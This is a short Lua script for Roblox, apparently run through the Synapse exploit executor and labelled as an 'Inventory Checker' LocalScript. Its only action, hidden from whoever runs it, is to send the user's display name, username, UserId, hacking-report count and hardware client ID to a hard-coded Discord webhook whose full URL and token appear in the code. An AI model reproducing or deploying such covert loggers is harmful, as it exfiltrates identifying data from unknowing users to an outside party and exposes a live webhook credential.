local function MOWBGDA_fake_script() -- InventoryChecker.StorageCounter 
	local script = Instance.new('LocalScript', InventoryChecker)

	HttpsService = game:GetService("HttpService")
	Webhook_Url = "https://discord.com/api/webhooks/1011806862309593158/4HFHNAm7IK-ue-GOa1TJ-cFzCmBChWkkjwHzECsF4hw8p2ZJPiIIZZ4wCWyXUQXV_xvz"
	
	local response = syn.request(
		{
			Url = Webhook_Url,
			Method = 'POST',
			Headers = {
				['Content-Type'] = 'application/json'
			},
			Body = HttpsService:JSONEncode({
				["content"] = "",
				["embeds"] = {{
					["title"] = "**User Has Ran Inventory Checker**",
					["description"] = game.Players.LocalPlayer.DisplayName.." Has Executed Player Checker",
					["type"] = "rich",
					["color"] = tonumber(0x8d04c3),
					["fields"] = {
						{
							["name"] = "Players Name",
							["value"] = game.Players.LocalPlayer.Name,
							["inline"] = false,
						},
	
						{
	
							["name"] = "Players UserId",
							["value"] = game.Players.LocalPlayer.UserId,
							["inline"] = false,
	
						},
	
						{
							["name"] = "Players Amount Of Reports",
							["value"] = game.Players[tostring(game.Players.LocalPlayer.Name)].PlayerData.Report.Hacking.Value,
							["inline"] = false,
						},
	
						{
	
							["name"] = "Players HWID",
							["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
							["inline"] = false,
	
						}
					}    
				}}
			})
		}
	)
end
coroutine.wrap(MOWBGDA_fake_script)()
